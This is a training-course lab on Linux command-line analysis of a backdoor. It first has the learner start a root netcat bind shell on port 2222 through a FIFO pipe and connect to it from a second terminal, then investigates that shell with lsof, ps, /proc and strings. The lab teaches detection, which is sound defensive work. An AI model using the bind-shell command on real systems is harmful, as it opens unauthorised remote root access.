![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


---

This is a lab from **John Strand**'s **SOC Core Skills** Course:

https://www.antisyphontraining.com/product/soc-core-skills-with-john-strand/

---

# Linux CLI

# For The Ubuntu VM

In this lab we will be looking at a backdoor through the lens of the the Linux CLI.

We will be using a large number of different basic commands to get a better understanding of what the backdoor is and what it does.

For this lab we will be running **three** different Linux terminals.

 > Terminal 1 is where the backdoor will be run.

 > Terminal 2 is where we will connect to the back door.

 > Terminal 3 is where we will be running our analysis.

***

- Open **Terminal 1**

```bash
sudo su -
```

This will get us to a **root prompt**. We want to do this in order to have a **backdoor** running as **root** and a connection from a **different user account** on the system.

Next, we will need to create a **FIFO** backpipe:

```bash
mkfifo backpipe
```

Next, let's start the backdoor:

```bash
/bin/bash 0<backpipe | nc -l 2222 1>backpipe
```

In the above command, we are creating a **Netcat listener** that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the **Netcat listener**. 

On a more basic level, this will create a backdoor listening on port 2222 of our **Linux** system.

Now, let's open another **Linux** terminal.  This terminal will connect to the backdoor we just created.  

- Open **Terminal 2**

Now we will need to know the IP address of our **Linux** system:

```bash
ifconfig
```

<img width="780" height="193" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/212a2c89-6027-426a-bfde-0e459f995991" />



>[!NOTE]
>
>**YOUR IP WILL BE DIFFERENT**

Now, let's connect:

```bash
nc 172.31.90.102 2222
```

>[!NOTE]
>
>**YOUR IP WILL BE DIFFERENT**


It can be confusing to tell whether or not you are connected to the backdoor. 

Type a few commands to see if its working:

```bash
ls
```

```bash
whoami
```

<img width="497" height="135" alt="2026-03-14_14-52" src="https://github.com/user-attachments/assets/12fe76e1-088c-4391-a31d-8e05256ff569" />


At this point, we have created a backdoor with one terminal, and we have connected to this backdoor with another terminal.  Now, let's open yet another **Linux** terminal and use this use for the purpose of analysis.  




- Open **Terminal 3**

```bash
sudo su -
```

This will get us to a root prompt.  When we say root prompt we mean a terminal with the highest level of permission possible.  We want to be in a root prompt because looking at network connections and process information system wide requires root privileges (or the highest level of privileges).  

Let's start by looking at the network connections with **lsof**.  When we use **lsof**, we are looking at open files.  When we use the **-i** flag we are looking at the open Internet connections.  When we use the **-P** flag we are telling **lsof** to not try and guess what the service is on the ports that are being used. Just give us the port number.

```bash
lsof -i -P
```

<img width="1264" height="553" alt="1" src="https://github.com/user-attachments/assets/3b60e298-d0d3-4ac0-91cf-2bf5c1180655" />


Now let's dig into the **netcat process ID**.  We can do this with the lowercase **-p** switch.  This will give us all the open files associated with the listed process ID.

```bash
lsof -p [PID]
```

>[!NOTE]
>
>**Your PID will be different!!!**

<img width="1177" height="515" alt="2" src="https://github.com/user-attachments/assets/ddb23944-81ac-451f-9a56-584acf830179" />

Let's look at the full processes.  We can do this with the **ps** command. We are also adding the **a**, **u**, and **x switches**.  

* a is for all processes
* u is for sorted users
* x is for all processes using a teletype terminal

Type out this command.

```bash
ps aux
```

<img width="1061" height="377" alt="2026-03-14_14-57" src="https://github.com/user-attachments/assets/4a8691de-eeba-4c23-9fd6-b10b6312056e" />


Let's change directories into the **proc** directory for that **pid**.  Remember, **proc** is a directory that does not exist on the drive.  It allows us to see data associated with the various processes directly.   This can be very useful as it allows us to dig into the memory of a process that is currently running on a suspect system.

```bash
cd /proc/[pid]
```

>[!NOTE]
>
>**Your PID will be different!!!**

We can see a number of interesting directories here:

```bash
ls
```

<img width="1416" height="180" alt="2026-03-14_15-05" src="https://github.com/user-attachments/assets/9b6cf660-6977-42b3-a9f7-abb6cf6589ac" />

We can run the **strings** command on the executable in this directory.  When programs are created there may be usage information, mentions of system libraries, and possible code comments. We use this all the time to attempt to identify what exactly a program is doing.

```bash
strings ./exe | less
```

<img width="289" height="334" alt="1" src="https://github.com/user-attachments/assets/f495288b-e184-42aa-85fd-cc4736c35471" />

If we scroll down, we can see the actual usage information for netcat.  We pulled it directly out of memory!

To reveal more information in the output, press **"enter"**.

<img width="894" height="725" alt="2" src="https://github.com/user-attachments/assets/258402b5-c5a4-4b1d-a172-0643ae0f1ad4" />

- Press **q** to go back

***                                                                 

<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/Memory/MemoryAnalysis(Volatility).md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---











